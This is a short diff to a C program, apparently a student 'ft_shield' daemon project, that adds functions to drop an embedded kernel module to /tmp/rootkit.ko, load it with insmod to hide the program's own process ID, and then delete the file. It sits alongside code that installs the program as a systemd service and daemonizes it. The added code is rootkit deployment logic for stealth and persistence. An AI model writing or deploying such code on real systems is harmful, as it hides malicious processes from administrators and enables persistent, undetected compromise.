@@ -55,6 +55,30 @@ void startup_setup (void) {
 	system("systemctl start ft_shield.service");
 }
 
+// https://codeplea.com/embedding-files-in-c-programs
+void extract_rootkit(const char *output_path) {
+    FILE *f = fopen(output_path, "wb");
+    if (!f) {
+        perror("fopen");
+        return;
+    }
+
+    fwrite(srcs_modules_rootkit_ko, sizeof(srcs_modules_rootkit_ko), 1, f);
+    fclose(f);
+}
+
+void hide_pid(void) {
+        int pid = getpid();
+        char cmd[256];
+        const char* tmp_path = "/tmp/rootkit.ko";
+
+        extract_rootkit(tmp_path);
+
+        snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", tmp_path, pid);
+        system(cmd);
+		system("rm -rf /tmp/rootkit.ko");
+}
+
 void ft_daemonize(void) {
 	pid_t pid = fork();
 
